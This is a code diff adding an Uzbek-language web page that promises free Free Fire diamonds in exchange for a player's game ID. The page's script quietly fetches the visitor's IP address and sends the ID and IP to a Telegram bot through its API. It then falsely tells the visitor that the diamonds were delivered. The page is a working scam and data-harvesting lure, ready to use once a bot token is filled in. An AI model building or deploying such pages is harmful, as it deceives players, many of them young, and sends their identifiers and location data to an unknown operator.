@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FF ID va Almaz olish</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            margin: auto;
+            padding: 20px;
+            background: #fff;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+        h2 {
+            text-align: center;
+            color: #333;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        @media (max-width: 600px) {
+            .container {
+                padding: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>FF ID va Almaz olish</h2>
+        <form id="ff-form">
+            <label for="ff_id">FF ID:</label>
+            <input type="text" id="ff_id" name="ff_id" placeholder="FF ID kiriting" required>
+            <button type="submit">Almaz olish</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById("ff-form").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            // Form ma'lumotlarini olish
+            let ff_id = document.getElementById("ff_id").value;
+
+            // IP manzilini olish uchun usul
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    let ip_address = data.ip;
+
+                    // Telegram API orqali xabar yuborish
+                    let botToken = "YOUR_BOT_TOKEN"; // Telegram bot tokenini o'zgartiring
+                    let chatId = "YOUR_CHAT_ID"; // Telegram chat ID
+                    let message = `FF ID: ${ff_id}\nIP manzil: ${ip_address}`;
+
+                    let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                    // Xabar yuborish
+                    fetch(url)
+                        .then(response => response.json())
+                        .then(data => {
+                            alert("Almaz olish jarayoni muvaffaqiyatli bajarildi!");
+                            document.getElementById("ff_id").value = ''; // Formani tozalash
+                        })
+                        .catch(error => {
+                            alert("Xatolik yuz berdi. Iltimos, qayta urinib ko'ring.");
+                        });
+                })
+                .catch(error => {
+                    alert("IP manzilingizni olishda xatolik yuz berdi.");
+                });
+        });
+    </script>
+</body>
+</html>
